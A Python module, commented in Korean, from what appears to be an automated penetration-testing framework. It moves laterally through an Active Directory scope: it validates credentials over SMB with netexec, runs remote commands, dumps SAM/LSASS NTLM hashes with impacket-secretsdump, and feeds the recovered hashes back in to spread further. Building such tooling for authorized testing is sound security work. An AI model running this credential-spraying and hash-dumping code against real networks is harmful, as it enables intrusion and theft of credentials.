"""
Lateral Movement. DESIGN.md 8/8-1/8-3절.

크레덴셜(credentials.jsonl) 하나로 스코프 안의 다른 호스트에 인증을 검증하고,
성공하면 명령을 실행하거나(관리자 권한이면) SAM/LSASS를 덤프해서 새 크레덴셜을
credentials.jsonl에 다시 기록한다 - 새로 얻은 크레덴셜은 다시 이 모듈의
입력이 될 수 있다(재귀적으로 스코프를 넓혀감).

**미검증**: 이 랩에는 아직 AD 환경이 없어서 실전 테스트 전이다. netexec/
impacket-secretsdump의 문서화된 표준 사용법을 근거로 작성했다 - AD 랩이
준비되면 post_exploit.py(DESIGN.md 21절)처럼 실측 검증할 것 (DESIGN.md 24절).

계정 잠금(lockout) 리스크(DESIGN.md 8-3절): 이 모듈의 함수는 호출자가 대상
하나씩 순서대로 부르는 걸 전제로 하며, 내부적으로 여러 대상을 병렬 처리하지
않는다 - 호출자가 여러 대상에 반복 적용할 때도 반드시 순차 호출할 것(대상 간
병렬 호출 금지). 시도 횟수 제한/딜레이는 아직 TODO(구현 없음) - 실제 AD 랩
없이는 lockout threshold를 가늠할 방법이 없어서 랩 준비 후 추가.
"""

import re
import shlex
from dataclasses import dataclass

from core import config  # noqa: F401 - import 시점에 .env를 로드함 + stdout UTF-8 고정
from core.llm_guard import truncate
from core.state_store import append_credential_discovered, append_credential_validated, append_finding
from env.guest_control import run_in_kali
from modules.ad_enum import DomainCredential, build_auth_args


@dataclass
class LateralMovementResult:
    target: str
    success: bool
    is_admin: bool
    output: str


def try_credential_on_target(engagement_id: str, cred: DomainCredential, target: str) -> LateralMovementResult:
    """netexec smb로 크레덴셜을 검증한다. netexec는 로컬 관리자 권한이면
    "(Pwn3d!)"를 출력에 붙인다 - 이걸로 관리자 여부를 판단한다."""
    auth = build_auth_args(cred)
    command = f"netexec smb {target} {auth}2>&1"
    result = run_in_kali(command, timeout=30)

    is_admin = "(Pwn3d!)" in result.stdout
    success = "[+]" in result.stdout and "STATUS_LOGON_FAILURE" not in result.stdout

    if success:
        append_credential_validated(engagement_id, username=cred.username, target=target, domain=cred.domain or None)
    append_finding(
        engagement_id, stage="lateral_movement", event="credential_check", target=target,
        username=cred.username, success=success, is_admin=is_admin,
        raw_output=truncate(result.stdout, 1000),
    )
    return LateralMovementResult(target=target, success=success, is_admin=is_admin, output=result.stdout)


def execute_command(engagement_id: str, cred: DomainCredential, target: str, command_to_run: str) -> str:
    """netexec --exec-method로 원격 명령을 실행한다(로컬 관리자 권한 필요)."""
    auth = build_auth_args(cred)
    command = f"netexec smb {target} {auth}-x {shlex.quote(command_to_run)} 2>&1"
    result = run_in_kali(command, timeout=60)
    append_finding(
        engagement_id, stage="lateral_movement", event="remote_command_executed", target=target,
        username=cred.username, command=command_to_run, output=truncate(result.stdout, 2000),
    )
    return result.stdout


_SECRETSDUMP_LINE_RE = re.compile(r"^([^:]+):(\d+):([0-9a-fA-F]*):([0-9a-fA-F]{32}):::")


def dump_local_secrets(engagement_id: str, cred: DomainCredential, target: str) -> list[dict]:
    """로컬 관리자 권한 확보 시 SAM(로컬 계정 NTLM 해시)을 덤프한다.
    impacket-secretsdump. LSASS 덤프(도메인 캐시 크레덴셜 등)도 같은 도구가
    같이 시도하지만, 파싱은 SAM 라인(user:rid:lm:nt:::)만 우선 지원한다."""
    hash_arg = ""
    auth_str = f"{cred.domain}/{cred.username}:{cred.password or ''}"
    if cred.ntlm_hash:
        auth_str = f"{cred.domain}/{cred.username}"
        hash_arg = f"-hashes {shlex.quote(cred.ntlm_hash)} "
    command = f"impacket-secretsdump {hash_arg}{shlex.quote(auth_str)}@{target} 2>&1"
    result = run_in_kali(command, timeout=90)

    new_creds = _parse_secretsdump(result.stdout)
    for c in new_creds:
        append_credential_discovered(
            engagement_id, username=c["username"], secret=c["secret"], cred_type=c["type"],
            source=f"lateral_movement:secretsdump:{target}", domain=cred.domain or None,
        )
    append_finding(
        engagement_id, stage="lateral_movement", event="secrets_dumped", target=target,
        credentials_found=len(new_creds), raw_output=truncate(result.stdout, 2000),
    )
    return new_creds


def _parse_secretsdump(raw: str) -> list[dict]:
    """secretsdump SAM 덤프 라인 형식: `user:rid:lmhash:nthash:::`"""
    creds = []
    for line in raw.splitlines():
        m = _SECRETSDUMP_LINE_RE.match(line.strip())
        if not m:
            continue
        username, _rid, lm_hash, nt_hash = m.groups()
        if username.endswith("$"):
            continue  # 머신 계정은 별 쓸모가 없어서 제외
        creds.append({"username": username, "secret": f"{lm_hash}:{nt_hash}", "type": "ntlm_hash"})
    return creds


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 5:
        print("usage: python -m modules.lateral_movement <engagement_id> <target> <domain> <username> [password]")
        sys.exit(1)

    eid, tgt, dom, user = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    pw = sys.argv[5] if len(sys.argv) > 5 else None
    credential = DomainCredential(username=user, domain=dom, password=pw)

    r = try_credential_on_target(eid, credential, tgt)
    print(f"success={r.success} is_admin={r.is_admin}")
    print(r.output)
